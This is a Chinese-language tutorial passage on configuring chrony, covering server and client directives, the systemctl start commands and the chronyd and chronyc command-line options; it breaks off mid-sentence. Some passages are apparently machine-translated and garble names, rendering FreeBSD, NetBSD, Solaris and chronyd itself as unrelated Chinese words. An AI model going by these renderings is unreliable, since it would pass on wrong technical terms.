allow 192.168.0.0/16 # allow \u6307\u4ee4\u7528\u4e8e\u6307\u5b9a\u5141\u8bb8 NTP \u5ba2\u6237\u7aef\u4f5c\u4e3a NTP \u670d\u52a1\u5668\u8bbf\u95ee\u8ba1\u7b97\u673a\u7684\u7279\u5b9a\u5b50\u7f51\u3002\u5b83\u8fd8\u63a7\u5236\u5728\u670d\u52a1\u5668\u4e0a\u542f\u7528 NTS \u65f6\u5bf9 NTS-KE \u5ba2\u6237\u7aef\u7684\u8bbf\u95ee\u3002 # \u9ed8\u8ba4\u8bbe\u7f6e\u662f\u4e0d\u5141\u8bb8\u4efb\u4f55\u5ba2\u6237\u7aef\u8bbf\u95ee\uff0c\u5373 chronyd \u7eaf\u7cb9\u4f5c\u4e3a NTP \u5ba2\u6237\u7aef\u8fd0\u884c\u3002\u5982\u679c\u4f7f\u7528 allow \u6307\u4ee4\uff0c\u5219 chronyd \u65e2\u662f\u5176\u670d\u52a1\u5668\u7684\u5ba2\u6237\u7aef\uff0c\u4e5f\u662f\u5176\u4ed6\u5ba2\u6237\u7aef\u7684\u670d\u52a1\u5668\u3002 # \u6b64\u6307\u4ee4\u53ef\u4ee5\u591a\u6b21\u4f7f\u7528\u3002\u8bfb\u53d6\u7684\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b #local stratum 10 # local \u6307\u4ee4\u542f\u7528\u4e86\u672c\u5730\u6a21\u5f0f\uff0c\u5373\u4f7f\u6ca1\u6709\u4e0e\u65f6\u95f4\u6e90\u540c\u6b65\uff0c\u4e5f\u8981\u670d\u52a1 #keyfile /etc/chrony.keys # \u5bc6\u94a5\u6587\u4ef6 logdir /var/log/chrony # \u6b64\u6307\u4ee4\u6307\u5b9a\u7528\u4e8e\u5199\u5165\u7531 log \u6307\u4ee4\u542f\u7528\u7684\u65e5\u5fd7\u6587\u4ef6\u7684\u76ee\u5f55\u3002\u5982\u679c\u8be5\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u5219\u5c06\u81ea\u52a8\u521b\u5efa\u8be5\u76ee\u5f55\u3002 #cmdport 323 #\u9ed8\u8ba4\u4e3a323\uff0c\u7528\u4e8e\u76d1\u89c6chronyd\u7684\u7aef\u53e3 #port 123 #\u5f53chronyd\u4f5c\u4e3aNTP\u670d\u52a1\u5668\u7684\u65f6\u5019\u6253\u5f00\u7684\u76d1\u542c\u7aef\u53e3\uff0cntp\u5ba2\u6237\u7aef\u4f1a\u901a\u8fc7\u8fd9\u4e2a\u7aef\u53e3\u4e0echronyd\u670d\u52a1\u5668\u8fdb\u884c\u540c\u6b65\u3002\u9ed8\u8ba4\u503c\u4e3a 123\uff0c\u5373\u6807\u51c6 NTP \u7aef\u53e3\u3002\u5982\u679c\u8bbe\u7f6e\u4e3a 0\uff0cchronyd \u5c06\u6c38\u8fdc\u4e0d\u4f1a\u6253\u5f00\u670d\u52a1\u5668\u7aef\u53e3\uff0c\u5e76\u5c06\u4e25\u683c\u5728\u4ec5\u5ba2\u6237\u7aef\u6a21\u5f0f\u4e0b\u8fd0\u884c\u3002 #log tracking #\u628a\u6bcf\u6b21\u4fee\u6539\u65f6\u95f4\u7684\u8bb0\u5f55\u5199\u5230tracking.log\u4e2d\u53bb \u66f4\u591a\u914d\u7f6e\u7ec6\u8282\u8bf7\u67e5\u770bchrony\u5b98\u7f51\uff1ahttps://chrony.tuxfamily.org/doc/4.3/chrony.conf.html \u542f\u52a8chronyd systemctl enable chronyd systemctl restart chronyd chrony\u4f5c\u4e3a\u5ba2\u6237\u7aef \u4fee\u6539chrony\u7684\u914d\u7f6e [root@VM-0-16-centos ~]# cat /etc/chrony.conf # \u8fd9\u91cc\u6539\u6210\u670d\u52a1\u7aef\u7684IP\u6216\u8005\u57df\u540d server xxx.xxx.xxx iburst \u542f\u52a8chronyd systemctl enable chronyd systemctl restart chronyd chronyd\u547d\u4ee4 \u8bed\u6cd5 chronyd [\u9009\u9879]...[\u6307\u4ee4]... \u529f\u80fd chronyd\u662f\u7528\u4e8e\u540c\u6b65\u7cfb\u7edf\u65f6\u949f\u7684\u5b88\u62a4\u8fdb\u7a0b\u3002\u5b83\u53ef\u4ee5\u5c06\u7cfb\u7edf\u65f6\u95f4\u4e0eNTP\u670d\u52a1\u5668\uff0c\u53c2\u8003\u65f6\u949f\uff08\u4f8b\u5982GPS\u63a5\u6536\u5668\uff09\u540c\u6b65\uff0c\u5e76\u901a\u8fc7chronyd\u4f7f\u7528\u952e\u76d8\u8fdb\u884c\u624b\u52a8\u8f93\u5165\u3002\u5b83\u8fd8\u53ef\u4ee5\u4f5c\u4e3a NTPv4 \uff08RFC 5905\uff09\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u4e3a\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u8ba1\u7b97\u673a\u63d0\u4f9b\u65f6\u95f4\u670d\u52a1\u3002 \u5982\u679c\u672a\u5728\u547d\u4ee4\u884c\u4e0a\u6307\u5b9a\u4efb\u4f55\u914d\u7f6e\u6307\u4ee4\uff0cchronyd \u5c06\u4ece\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5b83\u4eec\u3002\u6587\u4ef6\u7684\u7f16\u8bd1\u9ed8\u8ba4\u4f4d\u7f6e\u662f /etc/chrony.conf\u3002 \u4fe1\u606f\u6027\u6d88\u606f\u3001\u8b66\u544a\u548c\u9519\u8bef\u5c06\u8bb0\u5f55\u5230\u7cfb\u7edf\u65e5\u5fd7\u4e2d\u3002 \u9009\u9879 -4 \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u4e3b\u673a\u540d\u5c06\u4ec5\u89e3\u6790\u4e3a IPv4 \u5730\u5740\uff0c\u5e76\u4e14\u4ec5\u521b\u5efa IPv4 \u5957\u63a5\u5b57\u3002 -6 \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u4e3b\u673a\u540d\u5c06\u4ec5\u89e3\u6790\u4e3a IPv6 \u5730\u5740\uff0c\u5e76\u4e14\u4ec5\u521b\u5efa IPv6 \u5957\u63a5\u5b57\u3002 -f \u6587\u4ef6 \u6b64\u9009\u9879\u53ef\u7528\u4e8e\u6307\u5b9a\u914d\u7f6e\u6587\u4ef6\u7684\u5907\u7528\u4f4d\u7f6e\u3002\u7f16\u8bd1\u7684\u9ed8\u8ba4\u503c\u4e3a /etc/chrony.conf\u3002 -n \u5728\u6b64\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u5c06\u81ea\u5df1\u4e0e\u7ec8\u7aef\u5206\u79bb\u3002 -d \u5728\u6b64\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u5c06\u81ea\u5df1\u4e0e\u7ec8\u7aef\u5206\u79bb\uff0c\u5e76\u4e14\u6240\u6709\u6d88\u606f\u90fd\u5c06\u5199\u5165\u7ec8\u7aef\u800c\u4e0d\u662f syslog\u3002\u5982\u679c chronyd \u662f\u5728\u542f\u7528\u8c03\u8bd5\u652f\u6301\u7684\u60c5\u51b5\u4e0b\u7f16\u8bd1\u7684\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u6b64\u9009\u9879\u4e24\u6b21\u6765\u542f\u7528\u8c03\u8bd5\u6d88\u606f\u3002 -l \u6587\u4ef6 \u6b64\u9009\u9879\u5141\u8bb8\u5c06\u65e5\u5fd7\u6d88\u606f\u5199\u5165\u6587\u4ef6\uff0c\u800c\u4e0d\u662f syslog \u6216\u7ec8\u7aef\u3002 -L \u7ea7 \u6b64\u9009\u9879\u6307\u5b9a\u8981\u5199\u5165\u65e5\u5fd7\u6587\u4ef6\u3001syslog \u6216\u7ec8\u7aef\u7684\u6d88\u606f\u7684\u6700\u4f4e\u4e25\u91cd\u6027\u7ea7\u522b\u3002\u53ef\u4ee5\u6307\u5b9a\u4ee5\u4e0b\u7ea7\u522b\uff1a0\uff08\u4fe1\u606f\u6027\uff09\u30011\uff08\u8b66\u544a\uff09\u30012\uff08\u975e\u81f4\u547d\u9519\u8bef\uff09\u548c 3\uff08\u81f4\u547d\u9519\u8bef\uff09\u3002\u9ed8\u8ba4\u503c\u4e3a 0\u3002 -p \u5728\u6b64\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0cchronyd \u5c06\u6253\u5370\u914d\u7f6e\u5e76\u9000\u51fa\u3002\u5b83\u4e0d\u4f1a\u4e0e\u7ec8\u7aef\u5206\u79bb\u3002\u6b64\u9009\u9879\u53ef\u7528\u4e8e\u9a8c\u8bc1\u914d\u7f6e\u7684\u8bed\u6cd5\u5e76\u83b7\u53d6\u6574\u4e2a\u914d\u7f6e\uff0c\u5373\u4f7f\u5b83\u88ab\u62c6\u5206\u4e3a\u591a\u4e2a\u6587\u4ef6\u5e76\u7531 include \u6216 confdir \u6307\u4ee4\u8bfb\u53d6\u3002 -q \u5728\u6b64\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0cchronyd \u5c06\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u949f\u4e00\u6b21\u5e76\u9000\u51fa\u3002\u5b83\u4e0d\u4f1a\u4e0e\u7ec8\u7aef\u5206\u79bb\u3002 -Q \u6b64\u9009\u9879\u4e0e -q \u9009\u9879\u7c7b\u4f3c\uff0c\u53ea\u662f\u5b83\u53ea\u6253\u5370\u504f\u79fb\u91cf\u800c\u4e0d\u5bf9\u65f6\u949f\u8fdb\u884c\u4efb\u4f55\u6821\u6b63\uff0c\u5e76\u4e14\u5b83\u5141\u8bb8\u5728\u6ca1\u6709 root \u6743\u9650\u7684\u60c5\u51b5\u4e0b\u542f\u52a8 chronyd\u3002 -r \u6b64\u9009\u9879\u5c06\u5c1d\u8bd5\u91cd\u65b0\u52a0\u8f7d\u5e76\u5220\u9664\u5305\u542b\u6bcf\u4e2a\u670d\u52a1\u5668\u7684\u793a\u4f8b\u5386\u53f2\u8bb0\u5f55\u548c\u6b63\u5728\u4f7f\u7528\u7684\u53c2\u8003\u65f6\u949f\u7684\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u5e94\u4f4d\u4e8e\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 dumpdir \u6307\u4ee4\u6307\u5b9a\u7684\u76ee\u5f55\u4e2d\u3002\u5982\u679c\u60a8\u51fa\u4e8e\u4efb\u4f55\u539f\u56e0\uff08\u4f8b\u5982\u5b89\u88c5\u65b0\u7248\u672c\uff09\u60f3\u8981\u77ed\u6682\u505c\u6b62\u5e76\u91cd\u65b0\u542f\u52a8chronyd\uff0c\u5219\u6b64\u9009\u9879\u5f88\u6709\u7528\u3002\u4f46\u662f\uff0c\u5b83\u5e94\u8be5\u53ea\u7528\u4e8e\u5185\u6838\u53ef\u4ee5\u5728\u4e0d\u53d7\u65f6\u95f4\u63a7\u5236\u7684\u60c5\u51b5\u4e0b\u4fdd\u6301\u65f6\u949f\u8865\u507f\u7684\u7cfb\u7edf\uff08\u5373 Linux\u3001FreeBSD\u3001NetBSD\u3001\u5149\u6e90\u548c macOS 10.13 \u6216\u66f4\u9ad8\u7248\u672c\uff09\u3002 -R \u4f7f\u7528\u6b64\u9009\u9879\u65f6\uff0c\u5c06\u5ffd\u7565\u521d\u59cb\u5316\u540c\u6b65\u6307\u4ee4\u548c\u5177\u6709\u6b63\u9650\u5236\u7684 maketep \u6307\u4ee4\u3002\u6b64\u9009\u9879\u5728\u91cd\u65b0\u542f\u52a8 chronyd \u65f6\u5f88\u6709\u7528\uff0c\u53ef\u4ee5\u4e0e -r \u9009\u9879\u7ed3\u5408\u4f7f\u7528\u3002 -s \u6b64\u9009\u9879\u5c06\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u949f\u4ece\u8ba1\u7b97\u673a\u7684\u5b9e\u65f6\u65f6\u949f \uff08RTC\uff09 \u6216\u5230 driftfile \u6307\u4ee4\u6307\u5b9a\u7684\u6587\u4ef6\u7684\u4e0a\u6b21\u4fee\u6539\u65f6\u95f4\u3002\u5b9e\u65f6\u65f6\u949f\u4ec5\u5728 Linux \u4e0a\u53d7\u652f\u6301\u3002 \u5982\u679c\u4e0e -r \u6807\u5fd7\u7ed3\u5408\u4f7f\u7528\uff0cchronyd \u5c06\u5728\u4ece RTC \u8bbe\u7f6e\u7cfb\u7edf\u65f6\u949f\u540e\u5c1d\u8bd5\u4fdd\u7559\u65e7\u6837\u672c\u3002\u8fd9\u53ef\u7528\u4e8e\u5141\u8bb8 chronyd \u5728\u7cfb\u7edf\u91cd\u65b0\u542f\u52a8\u671f\u95f4\u6267\u884c\u589e\u76ca\u6216\u635f\u5931\u7387\u7684\u957f\u671f\u5e73\u5747\uff0c\u5e76\u4e14\u5bf9\u4e8e\u95f4\u6b47\u6027\u8bbf\u95ee\u5728\u4e0d\u4f7f\u7528\u65f6\u5173\u95ed\u7684\u7f51\u7edc\u7684\u7cfb\u7edf\u975e\u5e38\u6709\u7528\u3002\u4e3a\u4e86\u4f7f\u5176\u6b63\u5e38\u5de5\u4f5c\uff0c\u5b83\u4f9d\u8d56\u4e8echronyd\u80fd\u591f\u786e\u5b9a\u4e0a\u6b21\u8ba1\u7b97\u673a\u6253\u5f00\u65f6RTC\u548c\u7cfb\u7edf\u65f6\u949f\u4e4b\u95f4\u5dee\u5f02\u7684\u51c6\u786e\u7edf\u8ba1\u4fe1\u606f\u3002 \u5982\u679c\u6f02\u79fb\u6587\u4ef6\u7684\u4e0a\u6b21\u4fee\u6539\u65f6\u95f4\u540c\u65f6\u665a\u4e8e\u5f53\u524d\u65f6\u95f4\u548c RTC \u65f6\u95f4\uff0c\u5219\u7cfb\u7edf\u65f6\u95f4\u5c06\u8bbe\u7f6e\u4e3a\u8be5\u65f6\u95f4\uff0c\u4ee5\u6062\u590d\u4e4b\u524d\u505c\u6b62 chronyd \u7684\u65f6\u95f4\u3002\u8fd9\u5728\u6ca1\u6709RTC\u6216RTC\u635f\u574f\uff08\u4f8b\u5982\uff0c\u5b83\u6ca1\u6709\u7535\u6c60\uff09\u7684\u8ba1\u7b97\u673a\u4e0a\u5f88\u6709\u7528\u3002 -t timeout \u6b64\u9009\u9879\u8bbe\u7f6e\u8d85\u65f6\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u4e4b\u540e chronyd \u5c06\u9000\u51fa\u3002\u5982\u679c\u65f6\u949f\u672a\u540c\u6b65\uff0c\u5b83\u5c06\u4ee5\u975e\u96f6\u72b6\u6001\u9000\u51fa\u3002\u8fd9\u5bf9\u4e8e -q \u6216 -Q \u9009\u9879\uff08\u7528\u4e8e\u7f29\u77ed\u7b49\u5f85\u6d4b\u91cf\u7684\u6700\u957f\u65f6\u95f4\uff09\u6216 -r \u9009\u9879\uff08\u7528\u4e8e\u9650\u5236 chronyd \u8fd0\u884c\u65f6\u95f4\uff0c\u4f46\u4ecd\u5141\u8bb8\u5b83\u8c03\u6574\u7cfb\u7edf\u65f6\u949f\u7684\u9891\u7387\uff09\u975e\u5e38\u6709\u7528\u3002 -u user \u6b64\u9009\u9879\u8bbe\u7f6e chronyd \u5728\u542f\u52a8\u540e\u5c06\u5207\u6362\u5230\u7684\u7cfb\u7edf\u7528\u6237\u7684\u540d\u79f0\uff0c\u4ee5\u4fbf\u5220\u9664 root \u6743\u9650\u3002\u5b83\u8986\u76d6\u7528\u6237\u6307\u4ee4\u3002\u7f16\u8bd1\u7684\u9ed8\u8ba4\u503c\u4e3a root\u3002 \u5728 Linux \u4e0a\uff0c\u9700\u8981\u7f16\u8bd1\u65f6\u652f\u6301\u5e93\u5e93\u3002\u5728 macOS \u4e0a\uff0c\u81ea\u7531\u8f6f\u4ef6\u3001\u7f51\u7edc\u64cd\u4f5c\u7cfb\u7edf\u548c\u5149\u6e90\u5c06\u65f6\u95f4\u5206\u53c9\u6210\u4e24\u4e2a\u8fdb\u7a0b\u3002\u5b50\u8fdb\u7a0b\u4fdd\u7559 root \u6743\u9650\uff0c\u4f46\u53ea\u80fd\u4ee3\u8868\u7236\u8fdb\u7a0b\u6267\u884c\u975e\u5e38\u6709\u9650\u7684\u7279\u6743\u7cfb\u7edf\u8c03\u7528\u3002 -U \u6b64\u9009\u9879\u7981\u7528\u5bf9 root \u6743\u9650\u7684\u68c0\u67e5\uff0c\u4ee5\u5141\u8bb8\u5728\u975e root \u7528\u6237\u4e0b\u542f\u52a8 chronyd\uff0c\u5047\u8bbe\u8be5\u8fdb\u7a0b\u5c06\u5177\u6709\u5728\u6307\u5b9a\u914d\u7f6e\u4e2d\u6b63\u786e\u64cd\u4f5c\u6240\u9700\u7684\u6240\u6709\u529f\u80fd\uff08\u4f8b\u5982\uff0c\u7531\u670d\u52a1\u7ba1\u7406\u5668\u63d0\u4f9b\uff09\u548c\u5bf9\u6240\u6709\u6587\u4ef6\u3001\u76ee\u5f55\u548c\u8bbe\u5907\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8bf7\u6ce8\u610f\uff0c\u4e0d\u540c\u7684\u914d\u7f6e\u548c\u4e0d\u540c\u7684 Linux \u5185\u6838\u7248\u672c\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u529f\u80fd\u3002\u5f53\u914d\u7f6e\u672a\u77e5\u65f6\uff0c\u4e0d\u5efa\u8bae\u5728\u975e root \u7528\u6237\u4e0b\u542f\u52a8 chronyd\uff0c\u6216\u8005\u81f3\u5c11\u4ec5\u9650\u4e8e\u7279\u5b9a\u6307\u4ee4\u3002 -F level \u6b64\u9009\u9879\u914d\u7f6e\u7531 chronyd \u8fdb\u7a0b\u52a0\u8f7d\u7684\u7cfb\u7edf\u8c03\u7528\u7b5b\u9009\u5668\uff08\u5982\u679c\u7f16\u8bd1\u65f6\u652f\u6301 Linux \u5b89\u5168\u8ba1\u7b97 \uff08seccomp\uff09 \u5de5\u5177\uff09\u3002\u5b9a\u4e49\u4e86\u4e09\u4e2a\u7ea7\u522b\uff1a0\u30011\u30012.\u7b5b\u9009\u5668\u5728\u7ea7\u522b 0 \u5904\u7981\u7528\u3002\u5728\u7ea7\u522b 1 \u548c 2 \u4e2d\uff0c\u5982\u679c chronyd \u53d1\u51fa\u88ab\u8fc7\u6ee4\u5668\u963b\u6b62\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5219 chronyd \u5c06\u88ab\u6740\u6b7b\u3002\u53ef\u4ee5\u5c06\u7535\u5e73\u6307\u5b9a\u4e3a\u8d1f\u6570\u4ee5\u89e6\u53d1 SIGSYS \u4fe1\u53f7\uff0c\u800c\u4e0d\u662f SIGKILL\uff0c\u8fd9\u5bf9\u4e8e\u8c03\u8bd5\u975e\u5e38\u6709\u7528\u3002\u9ed8\u8ba4\u503c\u4e3a 0\u3002 \u5728\u7ea7\u522b 1 \u4e2d\uff0c\u7b5b\u9009\u5668\u4ec5\u5141\u8bb8\u901a\u5e38\u7531 chronyd \u8fdb\u884c\u7684\u9009\u5b9a\u7cfb\u7edf\u8c03\u7528\u3002\u5176\u4ed6\u7cfb\u7edf\u8c03\u7528\u88ab\u963b\u6b62\u3002\u4ec5\u5f53\u5df2\u77e5\u6b64\u7ea7\u522b\u5728\u5b89\u88c5\u4e86 chrony \u7684\u7cfb\u7edf\u7248\u672c\u4e0a\u6709\u6548\u65f6\uff0c\u624d\u5efa\u8bae\u4f7f\u7528\u6b64\u7ea7\u522b\u3002\u8fc7\u6ee4\u5668\u8fd8\u9700\u8981\u5141\u8bb8 chronyd \u6b63\u5728\u4f7f\u7528\u7684\u5e93\uff08\u4f8b\u5982 libc\uff09\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4f46\u5e93\u7684\u4e0d\u540c\u7248\u672c\u6216\u5b9e\u73b0\u53ef\u80fd\u4f1a\u8fdb\u884c\u4e0d\u540c\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u5982\u679c\u7b5b\u9009\u5668\u7f3a\u5c11\u7cfb\u7edf\u8c03\u7528\uff0c\u5219\u5373\u4f7f\u5728\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4e5f\u53ef\u80fd\u88ab\u7ec8\u6b62 chronyd\u3002 \u5728\u7ea7\u522b 2 \u4e2d\uff0c\u7b5b\u9009\u5668\u4ec5\u963b\u6b62\u5c11\u91cf\u7279\u5b9a\u7cfb\u7edf\u8c03\u7528\uff08\u4f8b\u5982\u5206\u53c9\u548c exec\uff09\u3002\u8fd9\u79cd\u65b9\u6cd5\u5e94\u8be5\u907f\u514d\u8bef\u62a5\uff0c\u4f46\u5bf9\u7cfb\u7edf\u514d\u53d7\u53d7\u635f\u7684 chronyd \u8fdb\u7a0b\u7684\u4fdd\u62a4\u8981\u6709\u9650\u5f97\u591a\u3002 \u4e0d\u80fd\u4f7f\u7528\u90ae\u4ef6\u66f4\u6539\u6307\u4ee4\u542f\u7528\u7b5b\u9009\u5668\u3002 -P \u4f18\u5148\u7ea7 \u5728 Linux\u3001FreeBSD\u3001NetBSD \u548c\u5149\u6e90\u4e0a\uff0c\u6b64\u9009\u9879\u5c06\u4ee5\u6307\u5b9a\u7684\u4f18\u5148\u7ea7\uff08\u5fc5\u987b\u5728 0 \u5230 100 \u4e4b\u95f4\uff09\u9009\u62e9SCHED_FIFO\u5b9e\u65f6\u8c03\u5ea6\u7a0b\u5e8f\u3002\u5728 macOS \u4e0a\uff0c\u6b64\u9009\u9879\u7684\u503c\u5fc5\u987b\u4e3a 0 \u624d\u80fd\u7981\u7528\u7ebf\u7a0b\u65f6\u95f4\u9650\u5236\u7b56\u7565\uff0c\u6216\u8005\u5176\u503c\u4e3a 1 \u624d\u80fd\u542f\u7528\u7b56\u7565\u3002\u5176\u4ed6\u7cfb\u7edf\u4e0d\u652f\u6301\u6b64\u9009\u9879\u3002\u9ed8\u8ba4\u503c\u4e3a 0\u3002 -m \u6b64\u9009\u9879\u5c06\u6309\u65f6\u95f4\u987a\u5e8f\u9501\u5b9a\u5230RAM\u4e2d\uff0c\u4ee5\u4fbf\u6c38\u8fdc\u4e0d\u4f1a\u5206\u9875\u3002\u6b64\u6a21\u5f0f\u4ec5\u5728 Linux\u3001\u81ea\u7531\u8f6f\u4ef6\u3001\u7f51\u7edc\u64cd\u4f5c\u7cfb\u7edf\u548c\u5149\u6e90\u4e0a\u53d7\u652f\u6301\u3002 -x \u6b64\u9009\u9879\u7981\u7528\u5bf9\u7cfb\u7edf\u65f6\u949f\u7684\u63a7\u5236\u3002\u4e0d\u4f1a\u5c1d\u8bd5\u5bf9\u65f6\u949f\u8fdb\u884c\u4efb\u4f55\u8c03\u6574\u3002\u5b83\u5c06\u5047\u8bbe\u65f6\u949f\u662f\u81ea\u7531\u8fd0\u884c\u7684\uff0c\u5e76\u4e14\u4ecd\u7136\u8ddf\u8e2a\u5176\u76f8\u5bf9\u4e8e\u4f30\u8ba1\u771f\u5b9e\u65f6\u95f4\u7684\u504f\u79fb\u91cf\u548c\u9891\u7387\u3002\u6b64\u9009\u9879\u5141\u8bb8\u5728\u6ca1\u6709\u8c03\u6574\u6216\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u949f\uff08\u4f8b\u5982\u5728\u67d0\u4e9b\u5bb9\u5668\u4e2d\uff09\u4ee5\u4f5c\u4e3aNTP\u670d\u52a1\u5668\u8fd0\u884c\u7684\u60c5\u51b5\u4e0b\u542f\u52a8chronyd\u3002 -v\uff0c --\u7248\u672c \u4f7f\u7528\u6b64\u9009\u9879\uff0cchronyd\u5c06\u6253\u5370\u7248\u672c\u53f7\u5230\u7ec8\u7aef\u5e76\u9000\u51fa\u3002 -h\uff0c --\u5e2e\u52a9 \u4f7f\u7528\u6b64\u9009\u9879\uff0cchronyd\u5c06\u5411\u7ec8\u7aef\u6253\u5370\u5e2e\u52a9\u6d88\u606f\u5e76\u9000\u51fa\u3002 \u8be6\u7ec6\u4fe1\u606f\u67e5\u8be2\uff1ahttps://chrony.tuxfamily.org/doc/4.3/chronyd.html chronyc\u547d\u4ee4 \u8bed\u6cd5 chronyc [\u9009\u9879]...[\u6307\u4ee4]... \u529f\u80fd chronyc\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u7a0b\u5e8f\uff0c\u53ef\u7528\u4e8e\u76d1\u89c6chronyd\u7684\u6027\u80fd\uff0c\u5e76\u5728\u8fd0\u884c\u65f6\u66f4\u6539\u5404\u79cd\u64cd\u4f5c\u53c2\u6570\u3002\u5982\u679c\u672a\u5728\u547d\u4ee4\u884c\u4e0a\u6307\u5b9a\u4efb\u4f55\u547d\u4ee4\uff0cchronyc\u5c06\u671f\u671b\u6765\u81ea\u7528\u6237\u7684\u8f93\u5165\u3002\u4ece\u7ec8\u7aef\u8fd0\u884c\u65f6\u5c06\u663e\u793a chronyc> \u3002\u5982\u679c chronyc \u7684\u8f93\u5165\u6216\u8f93\u51fa\u4ece\u6587\u4ef6\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\u6216\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\uff0c\u5219\u4e0d\u4f1a\u663e\u793a\u63d0\u793a\u3002 \u9009\u9879 -4 \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u4e3b\u673a\u540d\u5c06\u4ec5\u89e3\u6790\u4e3a IPv4 \u5730\u5740\u3002 -6 \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u4e3b\u673a\u540d\u5c06\u4ec5\u89e3\u6790\u4e3a IPv6 \u5730\u5740\u3002 -n \u6b64\u9009\u9879\u7981\u7528\u5c06 IP \u5730\u5740\u89e3\u6790\u4e3a\u4e3b\u673a\u540d\uff0c\u4f8b\u5982\uff0c\u4ee5\u907f\u514d\u7f13\u6162\u7684 DNS \u67e5\u627e\u3002\u957f\u5730\u5740\u4e0d\u4f1a\u88ab\u622a\u65ad\u4ee5\u9002\u5408\u8be5\u5217\u3002 -N \u6b64\u9009\u9879\u5141\u8bb8\u6253\u5370\u914d\u7f6e\u6587\u4ef6\u6216 chronyc \u547d\u4ee4\u4e2d\u6307\u5b9a\u7684 NTP \u6e90\u7684\u539f\u59cb\u4e3b\u673a\u540d\u6216 IP \u5730\u5740\u3002\u5982\u679c\u6ca1\u6709 -n \u548c -N \u9009\u9879\uff0c\u5219\u6253\u5370\u7684\u4e3b\u673a\u540d\u662f\u4ece\u53cd\u5411 DNS \u67e5\u627e\u4e2d\u83b7\u53d6\u7684\uff0c\u5e76\u4e14\u53ef\u4ee5\u4e0e\u6307\u5b9a\u7684\u4e3b\u673a\u540d\u4e0d\u540c\u3002 -c \u6b64\u9009\u9879\u5141\u8bb8\u4ee5\u9017\u53f7\u5206\u9694\u503c \uff08CSV\uff09 \u683c\u5f0f\u6253\u5370\u62a5\u8868\u3002\u53cd\u5411 DNS \u67e5\u627e\u5c06\u88ab\u7981\u7528\uff0c\u65f6\u95f4\u5c06\u6253\u5370\u4e3a\u81ea epoch \u4ee5\u6765\u7684\u79d2\u6570\uff0c\u5e76\u4e14\u4ee5\u79d2\u4e3a\u5355\u4f4d\u7684\u503c\u5c06\u4e0d\u4f1a\u8f6c\u6362\u4e3a\u5176\u4ed6\u5355\u4f4d\u3002\u4f8b\u5982 chronyc -c tracking \u4f1a\u628a\u7ed3\u679c\u6253\u5370\u6210CSV\u683c\u5f0f -d \u5982\u679c chronyc \u662f\u5728\u8c03\u8bd5\u652f\u6301\u4e0b\u7f16\u8bd1\u7684\uff0c\u5219\u6b64\u9009\u9879\u5141\u8bb8\u6253\u5370\u8c03\u8bd5\u6d88\u606f\u3002 -m \u901a\u5e38\uff0c\u547d\u4ee4\u884c\u4e0a\u7684\u6240\u6709\u53c2\u6570\u90fd\u88ab\u89e3\u91ca\u4e3a\u4e00\u4e2a\u547d\u4ee4\u3002\u4f7f\u7528\u6b64\u9009\u9879\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\u547d\u4ee4\u3002\u6bcf\u4e2a\u53c2\u6570\u5c06\u88ab\u89e3\u91ca\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u547d\u4ee4\u3002 -h \u4e3b\u673a \u6b64\u9009\u9879\u6307\u5b9a\u8981\u6309\u65f6\u95f4\u987a\u5e8f\u8054\u7cfb\u7684\u4e3b\u673a\u3002\u53ef\u4ee5\u4f7f\u7528\u4e3b\u673a\u540d\u3001IP \u5730\u5740\u6216\u672c\u5730 Unix \u57df\u5957\u63a5\u5b57\u7684\u8def\u5f84\u6765\u6307\u5b9a\u5b83\u3002\u53ef\u4ee5\u5c06\u591a\u4e2a\u503c\u6307\u5b9a\u4e3a\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u4ee5\u63d0\u4f9b\u56de\u9000\u3002 \u9ed8\u8ba4\u503c\u4e3a /var/run/chrony/chronyd.sock,127.0.0.1,::1 \uff0c\u5373\u8fd0\u884c\u65f6\u95f4\u8f74\u7684\u4e3b\u673a\u3002\u9996\u5148\uff0c\u5b83\u5c1d\u8bd5\u8fde\u63a5\u5230Unix\u57df\u5957\u63a5\u5b57\uff0c\u5982\u679c\u5931\u8d25\uff08\u4f8b\u5982\uff0c\u7531\u4e8e\u5728\u975eroot\u7528\u6237\u4e0b\u8fd0\u884c\uff09\uff0c\u5b83\u5c06\u5c1d\u8bd5\u8fde\u63a5\u5230127.0.0.1\uff0c\u7136\u540e\u662f::1\u3002 -p \u7aef\u53e3 \u6b64\u9009\u9879\u5141\u8bb8\u7528\u6237\u6307\u5b9a\u76ee\u6807\u65f6\u95f4\u8f74\u7528\u4e8e\u5176\u76d1\u89c6\u8fde\u63a5\u7684 UDP 